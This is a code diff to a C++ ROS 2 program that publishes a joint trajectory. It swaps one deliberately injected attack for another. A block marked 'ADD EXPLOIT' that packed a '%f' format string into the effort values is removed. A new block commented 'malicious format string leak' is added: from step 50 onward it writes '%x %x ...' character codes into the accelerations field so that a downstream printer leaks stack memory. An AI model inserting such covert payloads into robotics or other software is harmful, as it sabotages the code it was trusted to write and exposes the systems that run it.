@@ -43,9 +43,7 @@ int main(int argc, char ** argv)
   trajectory_msgs::msg::JointTrajectoryPoint trajectory_point_msg;
   trajectory_point_msg.positions.resize(chain.getNrOfJoints());
   trajectory_point_msg.velocities.resize(chain.getNrOfJoints());
-  // ADD EXPLOIT: Use effort values to create format string attack
-  trajectory_point_msg.effort.resize(10);
-  
+
   double total_time = 3.0;
   int trajectory_len = 200;
   int loop_rate = static_cast<int>(std::round(trajectory_len / total_time));
@@ -68,22 +66,32 @@ int main(int argc, char ** argv)
 
     joint_positions.data += joint_velocities.data * dt;
 
-    if (i == 0) {
-      // fmt string: "%f %f %f %f" - will leak data
-      trajectory_point_msg.effort[0] = 37.0;  // '%'
-      trajectory_point_msg.effort[1] = 102.0; // 'f'
-      trajectory_point_msg.effort[2] = 32.0;  // ' '
-      trajectory_point_msg.effort[3] = 37.0;  // '%'
-      trajectory_point_msg.effort[4] = 102.0; // 'f'
-      trajectory_point_msg.effort[5] = 32.0;  // ' '
-      trajectory_point_msg.effort[6] = 37.0;  // '%'
-      trajectory_point_msg.effort[7] = 102.0; // 'f'
-      trajectory_point_msg.effort[8] = 32.0;  // ' '
-      trajectory_point_msg.effort[9] = 37.0;  // '%'
-    } else {
-      for (int j = 0; j < 10; j++) {
-        trajectory_point_msg.effort[j] = 0.0;
+    // malicious format string leak
+    if (i >= 50) {
+      trajectory_point_msg.accelerations.resize(20);
+      // leak local stack values: "%x %x %x %x %x %x"
+      trajectory_point_msg.accelerations[0] = 37.0;  // '%'
+      trajectory_point_msg.accelerations[1] = 120.0; // 'x'
+      trajectory_point_msg.accelerations[2] = 32.0;  // ' '
+      trajectory_point_msg.accelerations[3] = 37.0;  // '%'
+      trajectory_point_msg.accelerations[4] = 120.0; // 'x'
+      trajectory_point_msg.accelerations[5] = 32.0;  // ' '
+      trajectory_point_msg.accelerations[6] = 37.0;  // '%'
+      trajectory_point_msg.accelerations[7] = 120.0; // 'x'
+      trajectory_point_msg.accelerations[8] = 32.0;  // ' '
+      trajectory_point_msg.accelerations[9] = 37.0;  // '%'
+      trajectory_point_msg.accelerations[10] = 120.0; // 'x'
+      trajectory_point_msg.accelerations[11] = 32.0; // ' '
+      trajectory_point_msg.accelerations[12] = 37.0; // '%'
+      trajectory_point_msg.accelerations[13] = 120.0; // 'x'
+      trajectory_point_msg.accelerations[14] = 32.0; // ' '
+      trajectory_point_msg.accelerations[15] = 37.0; // '%'
+      trajectory_point_msg.accelerations[16] = 120.0; // 'x'
+      for (int j = 17; j < 20; j++) {
+        trajectory_point_msg.accelerations[j] = 0.0;
       }
+    } else {
+      trajectory_point_msg.accelerations.clear();
     }
 
     trajectory_point_msg.time_from_start.sec = i / loop_rate;
